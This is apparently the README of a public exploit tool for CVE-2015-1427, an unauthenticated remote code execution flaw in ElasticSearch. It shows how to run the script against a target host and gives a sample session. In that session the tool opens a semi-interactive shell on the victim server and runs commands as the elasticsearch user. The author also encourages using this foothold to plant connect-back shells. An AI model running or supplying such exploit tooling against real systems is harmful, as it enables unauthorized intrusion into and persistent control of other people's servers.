# Exploit for CVE-2015-1427, ElasticSearch Unauthenticated Remote Code Execution

This is an exploit for a recently disclosed remote code execution vulnerability in the ElasticSearch software. Basically, whatever "genius" came up with ElasticSearch decided that allowing remote, unauthenticated users to execute arbritary Java code via JSON requests was clever, and then decided that a shitty sandbox would make the whole shebang "secure".
This exploit, unfortunately, is not up to the standards of previous ones, due to badchar limitations meaning I could not drop a shell properly without using wget - and I decided that using wget was unacceptable due to reliance on third parties to host our backconnect, so instead, we have a semi-interactive shell with which you can execute commands and drop your own connect back payloads and suchlike.

## Usage
To use, you simply need the target host. Simply execute the script with the only argument being the IP address or hostname of the vulnerable ElasticSearch instance.

Example Usage:
```
xrl:~$ python elastic_shell.py elasticsearch.local

▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓█   ▀ ▓██▒   ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██▒▒██▀ ▀█  ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒███   ▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒▓█  ▄ ▒██░   ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒████▒░██████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██░▒ ▓███▀ ░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░     ▒ ░  ░  ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
   ░     ░ ░    ░   ▒   ░  ░  ░    ░       ▒ ░░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░  ░    ░  ░     ░  ░      ░            ░  ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                                              ░                                                
 Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1
{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something
~$ id
uid=106(elasticsearch) gid=111(elasticsearch) groups=111(elasticsearch)
~$ uname -a
Linux elasticsearch 3.13.0-36-generic #63-Ubuntu SMP Wed Sep 3 21:30:07 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
~$ pwd
/
~$ exit
{!} Shell exiting!
xrl:~$
```

## ASCIICAST DEMO TIME \o/  
This demo demonstrates exploiting ES and dropping a connectback shell on it :)  
[![asciicast](https://asciinema.org/a/23380.png)](https://asciinema.org/a/23380)

## Licence
Licenced under the [WTFPL][wtfpl]

[wtfpl]: http://www.wtfpl.net/
